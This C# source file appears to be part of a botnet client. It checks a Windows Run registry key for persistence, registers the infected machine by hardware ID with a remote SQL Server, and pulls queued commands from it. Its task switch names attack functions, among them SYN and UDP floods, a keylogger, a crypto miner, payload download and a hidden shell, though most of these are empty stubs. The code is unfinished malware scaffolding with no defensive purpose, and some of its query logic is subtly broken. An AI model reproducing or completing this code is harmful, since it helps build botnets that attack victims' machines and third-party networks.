using System.Reflection;
using System.Data.SqlClient;
using System;

namespace Bot.Classes
{
    internal class Misc
    {
        public static string getFileLocation()
        {
            string loc = Assembly.GetExecutingAssembly().Location;
            if (loc == "" || loc == null)
            {
                loc = Assembly.GetEntryAssembly().Location;
            }
            return loc;
        }

        public static bool getKey(string key)
        {
            bool exists = false;
            Microsoft.Win32.RegistryKey reg = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", false);
            foreach (string r in reg.GetValueNames())
            {
                if (r == key)
                    exists = true;
            }
            return exists;
        }

        public static DateTime getDate()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                DateTime date = new DateTime();
                try
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT CONVERT(datetime,GETDATE())", conn))
                    {
                        date = Convert.ToDateTime(cmd.ExecuteScalar());
                    }
                }
                catch { }
                return date;
            }
        }

        public static void Task(string type)
        {
            switch (type)
            {
                case "clipboard":
                    Console.WriteLine("Clipboard");
                    break;
                case "http":
                    Console.WriteLine("HTTP");
                    break;
                case "syn":
                    Console.WriteLine("SYN");
                    break;
                case "udp":
                    Console.WriteLine("UDP");
                    break;
                case "download":

                    break;
                case "firefox":

                    break;
                case "homepage":

                    break;
                case "keylogger":

                    break;
                case "mine":

                    break;
                case "cleanse":

                    break;
                case "update":

                    break;
                case "uninstall":

                    break;
                case "viewhidden":

                    break;
                case "viewvisable":

                    break;
                case "shellhidden":

                    break;
                case "shellvisable":

                    break;
                default:

                    break;
            }
        }

        public static string getCtaskString()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                string CTaskString = "";
                using (SqlCommand cmd = new SqlCommand("SELECT CTask FROM bots WHERE HWID = @HWID", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    CTaskString = (string)cmd.ExecuteScalar();
                }
                return CTaskString;
            }
        }

        public static string[] getCTasks()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                string[] CTask = getCtaskString().Split(';');
                return CTask;
            }   
        }

        public static int getTaskAmount()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                int TaskAmount = 0;
                using (SqlCommand cmd = new SqlCommand("SELECT TaskAmount FROM bots where HWID = @HWID", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    TaskAmount = (int)cmd.ExecuteScalar();
                }
                return TaskAmount;
            }
        }

        public static int[] getTaskID()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                int[] TaskID = new int[getTaskAmount() + 1];
                for(int i = 1;i <= getTaskAmount();i++)
                {
                    using (SqlCommand cmd = new SqlCommand("SELECT TaskID from Tasks where HWID = @HWID;", conn))
                    {
                        cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                        TaskID[i] = Convert.ToInt32(cmd.ExecuteScalar());
                    }
                }
                return TaskID;
            }
        }

        public static string getTask(int i)
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                string Type = "";
                using (SqlCommand cmd = new SqlCommand("SELECT Type from Tasks where HWID = @HWID;", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    cmd.Parameters.AddWithValue("TaskID", getTaskID()[i]);
                    Type = cmd.ExecuteScalar().ToString();
                }
                return Type;
            }
        }

        public static bool Registered()
        {
            using (SqlConnection conn = new SqlConnection(Settings.SqlConn))
            {
                conn.Open();
                using (SqlCommand cmd = new SqlCommand("SELECT count(*) FROM Bots WHERE HWID = @HWID ", conn))
                {
                    cmd.Parameters.AddWithValue("HWID", Identification.getHWID());
                    if((int)cmd.ExecuteScalar() > 0)
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }
        }
    }
}